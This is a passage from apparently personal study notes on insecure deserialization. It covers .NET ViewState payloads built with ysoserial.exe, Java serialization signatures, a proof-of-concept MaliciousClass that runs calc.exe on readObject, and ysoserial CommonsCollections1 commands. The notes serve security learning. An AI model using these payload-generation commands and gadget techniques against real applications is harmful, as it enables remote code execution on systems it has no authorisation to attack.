    <p><a href="/../assets/img/study/attackserialization/Untitled%209.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%209.png" alt="Untitled" loading="lazy"></a></p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">hello.apsx</code> (frontend)</p>

    <p><a href="/../assets/img/study/attackserialization/Untitled%2010.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%2010.png" alt="Untitled" loading="lazy"></a></p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">web.config</code> (IIS standard config file)</p>

    <p><a href="/../assets/img/study/attackserialization/Untitled%2011.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%2011.png" alt="Untitled" loading="lazy"></a></p>
  </li>
  <li>
    <p>Intercept with burp and getting the ViewState</p>

    <p><a href="/../assets/img/study/attackserialization/Untitled%2012.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%2012.png" alt="Untitled" loading="lazy"></a></p>

    <p><a href="/../assets/img/study/attackserialization/Untitled%2013.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%2013.png" alt="Untitled" loading="lazy"></a></p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://127.0.0.1:9000/abcdabcdabcd"</code></p>

    <p><a href="/../assets/img/study/attackserialization/Untitled%2014.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%2014.png" alt="Untitled" loading="lazy"></a></p>
  </li>
</ul>

<p>For IIS users, the current default settings of IIS are to generate the key at runtime, and it’s different for each application. Which means that the viewstate parameter will change.</p>

<h2 id="serialization-in-java"><span class="me-2">Serialization in Java</span><a href="#serialization-in-java" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<hr />

<p><em>When assessing java-based WebAPP should pay attention to <strong>binary data</strong></em></p>

<ul>
  <li>Starts with: <code class="language-plaintext highlighter-rouge">,,aced0005</code> (hex) / <code class="language-plaintext highlighter-rouge">rO0aB</code> (base64)</li>
  <li>Looks like a list of java classes: <code class="language-plaintext highlighter-rouge">org.apache.something</code> / <code class="language-plaintext highlighter-rouge">java.lang.String</code></li>
</ul>

<p><em>Presence of such data <strong>may</strong> indicate that the target application is deserializing custom data.</em></p>

<h3 id="1º-create-a-serialized-object-to-understand-the-process-better"><span class="me-2"><strong><em>1º Create a serialized object to understand the process better.</em></strong></span><a href="#1º-create-a-serialized-object-to-understand-the-process-better" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p><strong>Item.java</strong> → <em>Class named item - Is a simple class that has two fields.</em></p>

<div class="language-jsx highlighter-rouge"><div class="code-header">
        <span data-label-text="Jsx"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="kr">package</span> <span class="nx">eLearn</span><span class="p">;</span>
<span class="k">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">io</span><span class="p">.</span><span class="nx">Serializable</span><span class="p">;</span>

<span class="kr">public</span> <span class="kd">class</span> <span class="nc">Item</span> <span class="kr">implements</span> <span class="nx">Serializable</span> <span class="p">{</span>
	<span class="nx">int</span> <span class="nx">id</span><span class="p">;</span>
	<span class="nb">String</span> <span class="nx">name</span><span class="p">;</span>
	
	<span class="kr">public</span> <span class="nc">Item</span><span class="p">(</span><span class="nx">int</span> <span class="nx">id</span> <span class="p">,</span> <span class="nb">String</span> <span class="nx">name</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">this</span><span class="p">.</span><span class="nx">id</span> <span class="o">=</span> <span class="nx">id</span><span class="p">;</span>
		<span class="k">this</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="nx">name</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>

</pre></td></tr></tbody></table></code></div></div>

<p><strong>Serialize.java →</strong> <em>Serialization Logic - Will make use of that class. First it’ll create an instance of the Item class, and then serialize that instance as well as save it to a file.</em></p>

<div class="language-jsx highlighter-rouge"><div class="code-header">
        <span data-label-text="Jsx"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre></td><td class="rouge-code"><pre><span class="kr">package</span> <span class="nx">eLearn</span><span class="p">;</span>

<span class="k">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">io</span><span class="p">.</span><span class="o">*</span><span class="p">;</span>

<span class="kd">class</span> <span class="nc">Serialize</span> <span class="p">{</span>
	<span class="kr">public</span> <span class="kd">static</span> <span class="k">void</span> <span class="nf">main</span><span class="p">(</span><span class="nb">String</span> <span class="nx">args</span><span class="p">[])</span> <span class="p">{</span>
		<span class="k">try</span> <span class="p">{</span>
			<span class="c1">// Create the object</span>
			<span class="nx">Item</span> <span class="nx">s1</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Item</span><span class="p">(</span><span class="mi">123</span><span class="p">,</span> <span class="dl">"</span><span class="s2">look</span><span class="dl">"</span><span class="p">);</span>
			
			<span class="c1">// Creating stream and writing the object</span>
			<span class="nx">FileOutputStream</span> <span class="nx">fout</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">FileOutputStream</span><span class="p">(</span><span class="dl">"</span><span class="s2">data.ser</span><span class="dl">"</span><span class="p">);</span>
			<span class="nx">ObjectOutputStream</span> <span class="nx">out</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ObjectOutputStream</span><span class="p">(</span><span class="nx">fout</span><span class="p">);</span>
			<span class="nx">out</span><span class="p">.</span><span class="nf">writeObject</span><span class="p">(</span><span class="nx">s1</span><span class="p">);</span>
			<span class="nx">out</span><span class="p">.</span><span class="nf">flush</span><span class="p">();</span>
			
			<span class="c1">// Closing the stream</span>
			<span class="nx">out</span><span class="p">.</span><span class="nf">close</span><span class="p">();</span>
			<span class="nx">System</span><span class="p">.</span><span class="nx">out</span><span class="p">.</span><span class="nf">println</span><span class="p">(</span><span class="dl">"</span><span class="s2">Serialized data saved to data.ser</span><span class="dl">"</span><span class="p">);</span>
			
		<span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">Exception</span> <span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
			<span class="nx">System</span><span class="p">.</span><span class="nx">out</span><span class="p">.</span><span class="nf">println</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
		<span class="p">}</span>
	<span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">type data.ser</code></p>

    <p><a href="/../assets/img/study/attackserialization/Untitled%2015.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%2015.png" alt="Untitled" loading="lazy"></a></p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">certutil -dump data.ser</code> - <em>is in binary format. Apart from some strings that disclose what serialized data might be, there are also some non-ASCII chars</em></p>

    <p><a href="/../assets/img/study/attackserialization/Untitled%2016.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%2016.png" alt="Untitled" loading="lazy"></a></p>
  </li>
</ul>

<p>The file begins with the <strong><code class="language-plaintext highlighter-rouge">,,ac ed 00 05”</code></strong> bytes which is a standard java serialized format signature.</p>

<p><a href="/../assets/img/study/attackserialization/Untitled%2017.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%2017.png" alt="Untitled" loading="lazy"></a></p>

<p>As java serialized data is in <strong>binary format,</strong> when used in <strong>WebApp</strong> its often encoded using <strong>Base64</strong> in order to mitigate non-ASCII bytes.</p>

<p>When inspect web applications for java serialized objects, you should also look for base64 strings tarting with **<code class="language-plaintext highlighter-rouge">,,rO0AB**”</code></p>

<p><a href="/../assets/img/study/attackserialization/Untitled%2018.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%2018.png" alt="Untitled" loading="lazy"></a></p>

<h3 id="2º-write-code-that-will-retrieve-the-serialized-data-out-of-the-binary-file"><span class="me-2"><strong><em>2º Write code that will retrieve the serialized data out of the binary file.</em></strong></span><a href="#2º-write-code-that-will-retrieve-the-serialized-data-out-of-the-binary-file" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p><strong>Deserialize.java</strong></p>

<div class="language-jsx highlighter-rouge"><div class="code-header">
        <span data-label-text="Jsx"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td class="rouge-code"><pre><span class="kr">package</span> <span class="nx">eLearn</span><span class="p">;</span>

<span class="k">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">io</span><span class="p">.</span><span class="o">*</span><span class="p">;</span>

<span class="kd">class</span> <span class="nc">Deserialize</span> <span class="p">{</span>

	<span class="kr">public</span> <span class="kd">static</span> <span class="k">void</span> <span class="nf">main</span><span class="p">(</span><span class="nb">String</span><span class="p">[]</span> <span class="nx">args</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">try</span> <span class="p">{</span>
			<span class="c1">//Creating stream to read the object</span>
			<span class="nx">ObjectInputStream</span> <span class="k">in</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ObjectInputStream</span><span class="p">(</span><span class="k">new</span> <span class="nc">FileInputStream</span><span class="p">(</span><span class="dl">"</span><span class="s2">data.ser</span><span class="dl">"</span><span class="p">));</span>
			<span class="nx">Item</span> <span class="nx">s</span> <span class="o">=</span> <span class="p">(</span><span class="nx">Item</span><span class="p">)</span><span class="k">in</span><span class="p">.</span><span class="nf">readObject</span><span class="p">();</span>
			
			<span class="c1">//Print the data of the serialized object</span>
			<span class="nx">System</span><span class="p">.</span><span class="nx">out</span><span class="p">.</span><span class="nf">println</span><span class="p">(</span><span class="nx">s</span><span class="p">.</span><span class="nx">id</span> <span class="o">+</span> <span class="dl">"</span><span class="s2"> </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">s</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span>
			
			<span class="c1">//Close the stream</span>
			<span class="k">in</span><span class="p">.</span><span class="nf">close</span><span class="p">();</span>
			
		<span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">Exception</span> <span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
			<span class="nx">System</span><span class="p">.</span><span class="nx">out</span><span class="p">.</span><span class="nf">println</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
		<span class="p">}</span>
		
	<span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">java eLearn.Deserialize</code></p>

    <p><a href="/../assets/img/study/attackserialization/Untitled%2019.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%2019.png" alt="Untitled" loading="lazy"></a></p>
  </li>
</ul>

<p>Change the “data.ser” file. After opening it in a text editor, we change the to-be-deserialized class named <code class="language-plaintext highlighter-rouge">,,Item"</code> to <code class="language-plaintext highlighter-rouge">,,ltxm"</code></p>

<p><a href="/../assets/img/study/attackserialization/Untitled%2020.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%2020.png" alt="Untitled" loading="lazy"></a></p>

<p>If now try to deserialize the data.ser file, an error occurs; This is because the class Itxm does not exist</p>

<p><a href="/../assets/img/study/attackserialization/Untitled%2021.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%2021.png" alt="Untitled" loading="lazy"></a></p>

<h3 id="3º-deserialization-conditions"><span class="me-2"><em>3º Deserialization Conditions</em></span><a href="#3º-deserialization-conditions" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>When serializing and deserializing data, the deserializing endpoint must know - this means, it has to <strong>include in its classpath</strong> or <strong>import</strong> - All the classes and packages that the serialized object consist of</p>

<p>Basically, attacking Java serialization is about passing the <strong>malicious state</strong> of an object to the deserializing endpoint.</p>

<p>Executing OS commands in Java could be done for example, by invoking code like</p>

<div class="language-jsx highlighter-rouge"><div class="code-header">
        <span data-label-text="Jsx"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nx">Java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nx">Runtime</span><span class="p">.</span><span class="nx">getRuntime</span><span class="p">.</span><span class="nf">exec</span><span class="p">(,,</span><span class="nx">whoami</span><span class="dl">"</span><span class="s2">)
</span></pre></td></tr></tbody></table></code></div></div>

<p>But in order to <strong>make the deserializing</strong> endpoint <strong>execute</strong> the above code, it <strong>should be enclosed</strong> in a serialized <strong>object’s property</strong>.</p>

<p>An <strong>Object’s Properties</strong> in their simplest form are spotted in the format below:</p>

<ul>
  <li><strong><code class="language-plaintext highlighter-rouge">Object.one.two</code></strong></li>
</ul>

<p>Reading from right to left you can traverse the name and know that:</p>

<ul>
  <li>Two is a property of one</li>
  <li>One is a property of Object</li>
</ul>

<p>In the same way, if you see:</p>

<div class="language-jsx highlighter-rouge"><div class="code-header">
        <span data-label-text="Jsx"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nx">Java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nx">Runtime</span><span class="p">.</span><span class="nx">getRuntime</span><span class="p">.</span><span class="nf">exec</span><span class="p">(,,</span><span class="nx">id</span><span class="dl">"</span><span class="s2">)
</span></pre></td></tr></tbody></table></code></div></div>

<p><em>exec(,,id”) is a property of getRuntime, which in turn is a property of Java.lang.Runtime</em></p>

<p>During deserialization the object’s properties are accessed recursively, leading to code execution at the very end of this process.</p>

<p>An opaque class order that allows chaining subsequent classes is possible thanks to <strong>reflection</strong>, which allows us to use methods without knowing them previously.</p>

<p>Reflection can be recognized by the <code class="language-plaintext highlighter-rouge">,,opaque"</code> calling order in the code.</p>

<p>A <strong>potentially exploitable condition</strong> in Java occurs when <strong>readObject()</strong> or similar function is called on user-controlled object and later, a method on that object is called.</p>

<p>An attacker is able to craft such an object containing multiple, nested properties, that upon method call will do something completely different, e.g. hijack the called method by implementing a <strong>Dynamic Proxy</strong> and an <strong>Invocation handler</strong> in the serialized objects properties.</p>

<p><strong>For example</strong></p>

<p><strong>Application Context:</strong></p>

<ul>
  <li>The application has a mechanism to read and deserialize objects from files. This could be for various legitimate reasons, such as loading configuration, state, or user data.</li>
  <li>The application expects the files to be safe and contain serialized instances of <code class="language-plaintext highlighter-rouge">VulnerableClass</code>.</li>
</ul>

<p><strong>Malicious File Creation (by the Attacker)</strong>:</p>

<ul>
  <li>The attacker creates a malicious file (“malicious.ser”) that contains a serialized instance of <code class="language-plaintext highlighter-rouge">MaliciousClass</code>.</li>
  <li>The attacker somehow gets this file into a location where the application will read it (e.g., through a file upload feature, social engineering, or exploiting another vulnerability).</li>
</ul>

<p><strong>Deserialization by the Application</strong>:</p>

<ul>
  <li>The application reads and deserializes the file “malicious.ser”, expecting it to contain a <code class="language-plaintext highlighter-rouge">VulnerableClass</code> object.</li>
  <li>During deserialization, the <code class="language-plaintext highlighter-rouge">readObject</code> method of the actual class in the file (<code class="language-plaintext highlighter-rouge">MaliciousClass</code>) is executed, running the malicious code.</li>
</ul>

<p><strong>1º VulnerableClass.java</strong> - The application expects to deserialize objects of this class:</p>

<div class="language-jsx highlighter-rouge"><div class="code-header">
        <span data-label-text="Jsx"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre><span class="kr">package</span> <span class="nx">eLearn</span><span class="p">;</span>

<span class="k">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">io</span><span class="p">.</span><span class="nx">Serializable</span><span class="p">;</span>
<span class="k">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">io</span><span class="p">.</span><span class="nx">ObjectInputStream</span><span class="p">;</span>
<span class="k">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">io</span><span class="p">.</span><span class="nx">IOException</span><span class="p">;</span>

<span class="kr">public</span> <span class="kd">class</span> <span class="nc">VulnerableClass</span> <span class="kr">implements</span> <span class="nx">Serializable</span> <span class="p">{</span>
	<span class="kr">private</span> <span class="kd">static</span> <span class="nx">final</span> <span class="nx">long</span> <span class="nx">serialVersionUID</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
	<span class="kr">private</span> <span class="nb">String</span> <span class="nx">data</span><span class="p">;</span>
	
	<span class="kr">private</span> <span class="k">void</span> <span class="nf">readObject</span><span class="p">(</span><span class="nx">ObjectInputStream</span> <span class="nx">ois</span><span class="p">)</span> <span class="nx">throws</span> <span class="nx">IOException</span><span class="p">,</span> <span class="nx">ClassNotFoundException</span> <span class="p">{</span>
		<span class="nx">ois</span><span class="p">.</span><span class="nf">defaultReadObject</span><span class="p">();</span>
		<span class="c1">// Vulnerable code: assumes the deserialized  data is safe to use</span>
		<span class="nx">System</span><span class="p">.</span><span class="nx">out</span><span class="p">.</span><span class="nf">println</span><span class="p">(</span><span class="dl">"</span><span class="s2">Data: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">data</span><span class="p">);</span>
	<span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p><strong>2º Desserialization.java</strong> - The application has code that deserializes objects from files:</p>

<div class="language-jsx highlighter-rouge"><div class="code-header">
        <span data-label-text="Jsx"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre><span class="kr">package</span> <span class="nx">eLearn</span><span class="p">;</span>

<span class="k">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">io</span><span class="p">.</span><span class="nx">FileInputStream</span><span class="p">;</span>
<span class="k">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">io</span><span class="p">.</span><span class="nx">ObjectInputStream</span><span class="p">;</span>
<span class="k">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">io</span><span class="p">.</span><span class="nx">IOException</span><span class="p">;</span>
<span class="k">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">io</span><span class="p">.</span><span class="nx">FileNotFoundException</span><span class="p">;</span>

<span class="kr">public</span> <span class="kd">class</span> <span class="nc">DeserializeVulnerable</span> <span class="p">{</span>
    <span class="kr">public</span> <span class="kd">static</span> <span class="k">void</span> <span class="nf">main</span><span class="p">(</span><span class="nb">String</span><span class="p">[]</span> <span class="nx">args</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">try </span><span class="p">(</span><span class="nx">ObjectInputStream</span> <span class="nx">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ObjectInputStream</span><span class="p">(</span><span class="k">new</span> <span class="nc">FileInputStream</span><span class="p">(</span><span class="dl">"</span><span class="s2">malicious.ser</span><span class="dl">"</span><span class="p">)))</span> <span class="p">{</span>
            <span class="nx">VulnerableClass</span> <span class="nx">obj</span> <span class="o">=</span> <span class="p">(</span><span class="nx">VulnerableClass</span><span class="p">)</span> <span class="nx">ois</span><span class="p">.</span><span class="nf">readObject</span><span class="p">();</span>
            <span class="nx">System</span><span class="p">.</span><span class="nx">out</span><span class="p">.</span><span class="nf">println</span><span class="p">(</span><span class="dl">"</span><span class="s2">Deserialization complete.</span><span class="dl">"</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">FileNotFoundException</span> <span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">e</span><span class="p">.</span><span class="nf">printStackTrace</span><span class="p">();</span>
        <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">IOException</span> <span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">e</span><span class="p">.</span><span class="nf">printStackTrace</span><span class="p">();</span>
        <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">ClassNotFoundException</span> <span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">e</span><span class="p">.</span><span class="nf">printStackTrace</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p><strong>What Happens in the Exploited Scenario</strong></p>

<ul>
  <li><strong>Malicious Object</strong>: The serialized data in “malicious.ser” actually contains an instance of <code class="language-plaintext highlighter-rouge">MaliciousClass</code>, not <code class="language-plaintext highlighter-rouge">VulnerableClass</code>.</li>
  <li><strong>Deserialization</strong>: When <code class="language-plaintext highlighter-rouge">ois.readObject()</code> is called, it reconstructs the <code class="language-plaintext highlighter-rouge">MaliciousClass</code> object.</li>
  <li><strong>Type Casting</strong>: Although the object is cast to <code class="language-plaintext highlighter-rouge">VulnerableClass</code>, it is actually an instance of <code class="language-plaintext highlighter-rouge">MaliciousClass</code>. Due to Java’s dynamic nature, the cast does not prevent the <code class="language-plaintext highlighter-rouge">readObject</code> method of <code class="language-plaintext highlighter-rouge">MaliciousClass</code> from being executed.</li>
  <li><strong>Execution of Malicious Code</strong>: The <code class="language-plaintext highlighter-rouge">readObject</code> method of <code class="language-plaintext highlighter-rouge">MaliciousClass</code> is invoked during deserialization, executing the malicious code (<code class="language-plaintext highlighter-rouge">Runtime.getRuntime().exec("calc.exe")</code>).</li>
</ul>

<p><strong>3º MaliciousClass.java</strong> - The attacker creates this class to exploit the deserialization vulnerability:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre>package eLearn;

import java.io.Serializable;
import java.io.ObjectInputStream;
import java.io.IOException;

public class MaliciousClass implements Serializable {
    private static final long serialVersionUID = 1L;

    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ois.defaultReadObject();
        // Malicious code execution using ProcessBuilder
        ProcessBuilder processBuilder = new ProcessBuilder("calc.exe"); 
        processBuilder.start();
    }
}
</pre></td></tr></tbody></table></code></div></div>

<p><strong>4º SerializeMaliciousObject.java -</strong> The attacker serializes <code class="language-plaintext highlighter-rouge">MaliciousClass</code> and creates “malicious.ser”:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre>package eLearn;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.io.IOException;

public class SerializeMaliciousObject {
	public static void main(String[] args) {
		MaliciousClass maliciousObject = new MaliciousClass();
		try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("malicious.ser"))) {
			oos.writeObject(maliciousObject);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
}

</pre></td></tr></tbody></table></code></div></div>

<p>Compile the Java classes</p>

<div class="language-jsx highlighter-rouge"><div class="code-header">
        <span data-label-text="Jsx"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nx">javac</span> <span class="nx">eLearn</span><span class="o">/</span><span class="nx">MaliciousClass</span><span class="p">.</span><span class="nx">java</span> <span class="nx">eLearn</span><span class="o">/</span><span class="nx">SerializeMaliciousObject</span><span class="p">.</span><span class="nx">java</span> <span class="nx">eLearn</span><span class="o">/</span><span class="nx">VulnerableClass</span><span class="p">.</span><span class="nx">java</span> <span class="nx">eLearn</span><span class="o">/</span><span class="nx">DeserializeVulnerable</span><span class="p">.</span><span class="nx">java</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Run the <code class="language-plaintext highlighter-rouge">SerializeMaliciousObject</code> class to create the “malicious.ser” file:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>java eLearn.SerializeMaliciousObject
</pre></td></tr></tbody></table></code></div></div>

<p>Run the <code class="language-plaintext highlighter-rouge">DeserializeVulnerable</code></p>

<div class="language-jsx highlighter-rouge"><div class="code-header">
        <span data-label-text="Jsx"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nx">java</span> <span class="nx">eLear</span><span class="p">.</span><span class="nx">DeserializeVulnerable</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>
    <p>Result</p>

    <p><a href="/../assets/img/study/attackserialization/Untitled%2022.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%2022.png" alt="Untitled" loading="lazy"></a></p>
  </li>
</ul>

<h3 id="4º-gadgets--ysoserial"><span class="me-2"><em>4º Gadgets &amp; Ysoserial</em></span><a href="#4º-gadgets--ysoserial" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Every property or method that is part of a <strong>nested exploit</strong> object is called a <strong>gadget</strong></p>

<ul>
  <li>
    <p><strong>nested exploit what’s it</strong></p>

    <p>A “nested exploit” refers to a complex exploit technique where multiple smaller exploits, often referred to as “gadgets,” are combined in a structured way to achieve a larger, more sophisticated attack.</p>

    <p>When the exploit process involves multiple layers or components working together, it is referred to as a nested exploit. These components are nested within each other forming a complex structure.</p>

    <p>Each property or method within the nested exploit that <strong>performs a specific function</strong> is called a <strong>gadget</strong>.</p>

    <p>Nested exploits are often used in advanced attacks because they can bypass certain security mechanisms, such as <strong>Data Execution Prevention (DEP)</strong></p>
  </li>
</ul>

<p>There is a set of common libraries that were identified as <strong>gadget libraries</strong>  → <em>this doesn’t mean that they are insecure by design  - But the attacker can abuse them to construct a known gadget chain.</em></p>

<p><strong>CommonsCollections</strong> (version 1-6) is a library that were identified as vulnerable.</p>

<p>There’s is a tool named <a href="https://github.com/frohoff/ysoserial"><strong>ysoserial</strong></a> that can be used to perform exploitation of <strong>insecure java deserialization</strong>.</p>

<ul>
  <li>
    <p>Multiple modules that can suite various Java deserialization exploitation</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">java -jar ysoserial-all.jar</code> - Displays the help message</p>

    <p><a href="/../assets/img/study/attackserialization/Untitled%2023.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%2023.png" alt="Untitled" loading="lazy"></a></p>
  </li>
</ul>

<p>The payload names displayed in the help message are <strong>Library names</strong> that the gadgets will be taken from.</p>

<p>The <strong>ysoserial</strong> payload is in binary format. Often will need to convert the output to base64 in order to be able to send it to an application.</p>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">java --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections1 "whoami"</code>
<code class="language-plaintext highlighter-rouge">java --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections1 "whoami" | base64</code></p>

    <p><a href="/../assets/img/study/attackserialization/Untitled%2024.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%2024.png" alt="Untitled" loading="lazy"></a></p>
  </li>
</ul>

<p>The command above generates a serialized payload, that upon being insecurely deserialized by an application that includes <strong>CommonsCollections1</strong> in its classpath, will result in executing the command <code class="language-plaintext highlighter-rouge">,,whoami"</code></p>

<p>Its usage <strong>isn’t the most convenient</strong> when assessing <strong>WebAPP</strong> due to being a command line script.</p>

